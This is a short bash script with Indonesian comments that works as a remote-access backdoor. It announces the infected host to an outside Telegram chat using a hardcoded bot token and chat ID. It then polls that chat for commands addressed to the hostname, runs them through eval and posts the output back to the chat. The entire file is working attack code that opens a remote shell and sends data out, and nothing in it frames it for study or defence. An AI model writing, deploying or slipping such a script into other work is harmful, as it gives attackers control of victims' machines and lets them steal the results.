#!/bin/bash

# Konfigurasi Telegram
BOT_TOKEN="7703354895:AAGvQSrM3JKKlIPd_v_yFxlCQYMO96DE5lg"
CHAT_ID="-1002470378353"
TARGET_ID=$(hostname)  # Gunakan hostname sebagai ID unik

# Fungsi untuk mengirim hasil ke Telegram
send_telegram() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
        -d chat_id="${CHAT_ID}" \
        -d text="${message}" &>/dev/null
}

# Kirim notifikasi saat script dijalankan
send_telegram "✅ Target: *$TARGET_ID* terhubung."

# Loop untuk cek perintah dari Telegram
LAST_UPDATE_ID=0
while true; do
    # Ambil pesan terbaru dari Telegram
    RESPONSE=$(curl -s "https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${LAST_UPDATE_ID}")

    # Ambil data perintah dan target
    COMMAND=$(echo "$RESPONSE" | jq -r '.result[-1].message.text' | awk '{for(i=2;i<=NF;++i) printf $i" "; print ""}')
    SELECTED_TARGET=$(echo "$RESPONSE" | jq -r '.result[-1].message.text' | awk '{print $1}')
    UPDATE_ID=$(echo "$RESPONSE" | jq -r '.result[-1].update_id')

    # Jika ada perintah baru dan target cocok dengan hostname
    if [[ "$UPDATE_ID" != "null" && "$UPDATE_ID" -gt "$LAST_UPDATE_ID" && "$SELECTED_TARGET" == "$TARGET_ID" ]]; then
        LAST_UPDATE_ID=$((UPDATE_ID + 1))

        # Jalankan perintah dan kirim hasilnya
        OUTPUT=$(eval "$COMMAND" 2>&1)
        send_telegram "📡 Target: *$TARGET_ID*\n💻 Command: $COMMAND\n📤 Output:\n$OUTPUT"
    fi

    sleep 5
done

